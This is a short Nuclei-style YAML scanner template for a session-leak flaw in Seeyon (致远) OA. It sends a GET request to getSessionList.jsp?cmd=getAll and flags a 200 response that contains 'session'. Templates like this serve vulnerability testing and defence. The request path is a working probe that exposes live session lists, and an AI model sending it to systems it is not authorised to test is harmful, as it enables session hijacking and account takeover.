id: session-leak

info:
  name: 致远OA Session 泄漏漏洞
  author: '0x404'
  severity: high
  description: 检测致远OA Session 泄漏漏洞
  tags: session-leak,seeyon

requests:
  - method: GET
    path:
      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "session"  # 可以根据实际返回内容调整
